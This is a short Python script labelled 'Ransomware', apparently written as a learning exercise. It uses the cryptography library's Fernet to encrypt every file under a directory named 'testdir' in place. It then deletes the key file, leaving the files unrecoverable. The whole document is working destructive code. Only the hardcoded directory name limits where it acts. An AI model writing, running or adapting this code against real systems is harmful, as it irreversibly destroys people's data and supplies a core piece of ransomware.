#!/usr/bin/python3

# Script Name: Ransomware
# Author Name: Carsten Rossen
# Date of Latest Revision: 7/29/21
# Purpose: Encrypts all the files in a specified directory.


# Import libraries
from cryptography.fernet import Fernet
import os


# Define functions
def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("secret.key", "rb").read()

def encrypt_file(path):
    key = load_key()
    fernet = Fernet(key)
    with open(path, "rb") as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(path, "wb") as encrypted_file:
        encrypted_file.write(encrypted)

# Main

generate_key()
for root, dirs, files in os.walk("testdir", topdown=False):
    for file in files:
        path = os.path.join(root, file)
        encrypt_file(path)

os.remove("secret.key")

# End
